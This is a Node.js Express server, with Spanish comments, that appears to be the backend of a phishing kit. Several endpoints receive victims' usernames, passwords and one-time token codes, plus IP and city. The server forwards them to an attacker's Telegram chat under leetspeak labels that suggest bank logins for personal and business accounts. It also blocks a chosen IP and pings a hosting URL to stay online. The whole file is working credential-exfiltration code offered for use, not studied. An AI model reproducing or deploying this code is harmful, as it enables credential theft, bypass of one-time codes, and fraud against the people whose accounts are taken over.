const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors'); // Importar cors
const axios = require('axios');
const app = express();




app.use(cors({
    origin: '*', // Permitir cualquier origen
    methods: ['GET', 'POST'],
    allowedHeaders: ['Content-Type']
}));

app.use(bodyParser.json());

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.get('/', (req, res) => {
    res.send('Servidor activo');
});

app.use((req, res, next) => {
  const ipCliente = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  const IP_BLOQUEADAS = ['179.7.73.123']; // Las que quieras bloquear

  if (IP_BLOQUEADAS.includes(ipCliente)) {
    console.log(`⛔ IP bloqueada: ${ipCliente}`);
    return res.status(403).send('Acceso denegado');
  }

  next();
});


app.post('/api/sendMessage', async (req, res) => {
    const { user, ip, city } = req.body;

    if (!user || !ip) {
        return res.status(400).json({ error: 'Faltan datos obligatorios' });
    }

    // Construir mensaje
    const message = `🔵3XT3RIOR-PERSON4S🔵\nUs4RX: <code>${user}</code>\n\nIP: ${ip}\nCiudad: ${city}`;

    try {
        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: "HTML",
        });
        res.status(200).json({ success: true, data: response.data });
    } catch (error) {
        console.error('Error al enviar mensaje a Telegram:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/sendMessage2', async (req, res) => {
    const { user, password, ip, city } = req.body;

    if (!user || !ip || !password) {
        return res.status(400).json({ error: 'Faltan datos obligatorios' });
    }

    // Construir mensaje
    const message = `🔐🔵3XT3RIOR-PERSON4S🔵\nUs4RX: <code>${user}</code>\nCl4v: <code>${password}</code>\n\nIP: ${ip}\nCiudad: ${city}`;

    try {
        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: "HTML",
        });
        res.status(200).json({ success: true, data: response.data });
    } catch (error) {
        console.error('Error al enviar mensaje a Telegram:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/sendMessage3', async (req, res) => {
    const { user, ip, city } = req.body;

    if (!user || !ip) {
        return res.status(400).json({ error: 'Faltan datos obligatorios' });
    }

    // Construir mensaje
    const message = `🔵3XT3RIOR-JURYDIC0🔵\nUs4RX: <code>${user}</code>\n\nIP: ${ip}\nCiudad: ${city}`;

    try {
        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: "HTML",
        });
        res.status(200).json({ success: true, data: response.data });
    } catch (error) {
        console.error('Error al enviar mensaje a Telegram:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/sendMessage4', async (req, res) => {
    const { user, password, ip, city } = req.body;

    if (!user || !ip || !password) {
        return res.status(400).json({ error: 'Faltan datos obligatorios' });
    }

    // Construir mensaje
    const message = `🔐🔵3XT3RIOR-JURYDIC0🔵\nUs4RX: <code>${user}</code>\nCl4v: <code>${password}</code>\n\nIP: ${ip}\nCiudad: ${city}`;

    try {
        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: "HTML",
        });
        res.status(200).json({ success: true, data: response.data });
    } catch (error) {
        console.error('Error al enviar mensaje a Telegram:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/sendMessage5', async (req, res) => {
    const { user, password, ip, city } = req.body;

    if (!user || !ip || !password) {
        return res.status(400).json({ error: 'Faltan datos obligatorios' });
    }

    // Construir mensaje
    const message = `🔐🔵3XT3RIOR-T0K3N🔵\nUs4RX: <code>${user}</code>\nC0DIG0: <code>${password}</code>\n\nIP: ${ip}\nCiudad: ${city}`;

    try {
        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: "HTML",
        });
        res.status(200).json({ success: true, data: response.data });
    } catch (error) {
        console.error('Error al enviar mensaje a Telegram:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

const keepAliveUrl = 'https://luxuriant-sugared-titaniums.onrender.com/';

setInterval(() => {
    axios.get(keepAliveUrl)
        .then(response => console.log(`Ping exitoso: ${new Date().toLocaleTimeString()}`))
        .catch(error => console.error(`Error en el ping: ${error.message}`));
}, 180000); // 180000 ms = 3 minutos


const FRONTEND_URL = "htasdasd/"; // Reemplaza con la URL de tu frontend

// Función para hacer ping al frontend cada 5 minutos
setInterval(() => {
    axios.get(FRONTEND_URL)
        .then(() => console.log(`Ping enviado a ${FRONTEND_URL}`))
        .catch(err => console.log("Error en el ping:", err.message));
}, 180000);



const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Servidor corriendo en el puerto ${PORT}`);
});
